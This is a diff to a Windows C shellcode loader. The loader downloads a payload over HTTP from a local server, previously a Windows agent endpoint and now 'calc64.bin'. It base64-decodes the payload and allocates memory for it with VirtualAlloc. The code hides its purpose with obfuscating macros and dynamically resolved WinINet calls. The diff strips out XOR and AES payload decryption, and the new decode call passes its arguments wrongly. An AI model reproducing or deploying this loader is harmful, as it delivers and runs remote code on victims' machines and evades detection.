@@ -7,6 +7,7 @@
 #include "aes.h"
 #include "Structs.h"
 #include "GetterFunctions.h"
+#include "b64.h"
 
 #pragma comment(lib, "wininet.lib")
 #pragma comment(lib, "bcrypt.lib")
@@ -14,8 +15,6 @@
 
 #define NT_SUCCESS(Status)          (((NTSTATUS)(Status)) >= 0)
 #define STATUS_UNSUCCESSFUL         ((NTSTATUS)0xC0000001L)
-
-//#include "Structs.h"
 
 #define l char
 #define m *
@@ -30,18 +29,15 @@ n* memMirror(n* aA, const n* bB, t cC) { l m x s(l m)aA, m y s(l m)bB; o(cC q)* 
 
 BOOL Base64Decode(PCHAR base64, DWORD base64Size, PBYTE* pDecoded, DWORD* pDecodedSize) {
     if (!CryptStringToBinaryA(base64, base64Size, CRYPT_STRING_BASE64, NULL, pDecodedSize, NULL, NULL)) {
-        printf("First base64 decode: Error %u in CryptStringToBinaryA.", GetLastError());
         return FALSE;
     }
 
     *pDecoded = (PBYTE)malloc(*pDecodedSize);
     if (*pDecoded == NULL) {
-        printf("Memory allocation failed.");
         return FALSE;
     }
 
     if (!CryptStringToBinaryA(base64, base64Size, CRYPT_STRING_BASE64, *pDecoded, pDecodedSize, NULL, NULL)) {
-        printf("Second base64 decode: Error %u in CryptStringToBinaryA.", GetLastError());
         free(*pDecoded);
         return FALSE;
     }
@@ -77,7 +73,7 @@ int main() {
         if (pInternetOpen != NULL && pInternetOpenUrl != NULL && pInternetReadFile != NULL && pInternetCloseHandle != NULL) {
             HINTERNET hInternet = pInternetOpen(L"User Agent", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
             if (hInternet != NULL) {
-                HINTERNET hConnect = pInternetOpenUrl(hInternet, L"http://localhost:8081/agents/windows/cs", NULL, 0, INTERNET_FLAG_RELOAD, 0);
+                HINTERNET hConnect = pInternetOpenUrl(hInternet, L"http://localhost:10000/calc64.bin", NULL, 0, INTERNET_FLAG_RELOAD, 0);
                 if (hConnect != NULL) {
                     while (pInternetReadFile(hConnect, buffer + totalBytesRead, sizeof(buffer) - totalBytesRead, &bytesRead) && bytesRead > 0) {
                         totalBytesRead += bytesRead;
@@ -95,28 +91,10 @@ int main() {
     unsigned char* shellcode = NULL;
     DWORD* shellcode_size = 0;
 
-    DWORD cbData = 0;
-    DWORD decryptedSize = 0;
-    unsigned char xorKey[] = "#1";
-    DWORD xorKeySize = strlen(xorKey);
-    unsigned char aesKey[] = "#2";
-    DWORD aesKeySize = strlen(aesKey);
-    unsigned char aesIV[] = "#3";
-    DWORD aesIVSize = strlen(aesIV);
+    Base64Decode(buffer, totalBytesRead, shellcode, shellcode_size);
 
-    PBYTE encryptedPayload;
-    DWORD encryptedSize;
-
-    Base64Decode(buffer, totalBytesRead, &encryptedPayload, &encryptedSize);
-
-    XOR(encryptedPayload, encryptedSize, xorKey, xorKeySize);
-
-    struct AES_ctx ctx;
-    AES_init_ctx_iv(&ctx, aesKey, aesIV);
-    AES_CBC_decrypt_buffer(&ctx, encryptedPayload, encryptedSize);
-
-    shellcode = encryptedPayload;
-    shellcode_size = encryptedSize;
+ /*   shellcode = buffer;
+    shellcode_size = totalBytesRead;*/
 
     void* execMem = VirtualAlloc(0, shellcode_size, MEM_COMMIT, PAGE_READWRITE);
     if (execMem != NULL) {
